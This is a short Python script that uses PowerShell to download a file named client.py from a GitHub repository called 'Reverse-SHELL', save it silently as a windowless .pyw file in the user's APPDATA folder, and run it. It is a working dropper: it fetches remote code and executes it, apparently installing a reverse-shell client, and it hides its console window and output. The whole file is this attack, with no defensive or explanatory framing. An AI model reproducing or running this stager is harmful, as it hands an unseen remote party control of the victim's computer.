import os, sys, subprocess

username = os.environ.get('USERNAME')
path = os.environ['appdata']

################################################ setup #################################################################
powershell_command = (f'powershell invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse'
                      f'-SHELL/master/client.py" -outfile "{path}\\client.pyw"')
subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)

powershell_command = f'powershell.exe {path}\\client.pyw'
subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
################################################ done ##################################################################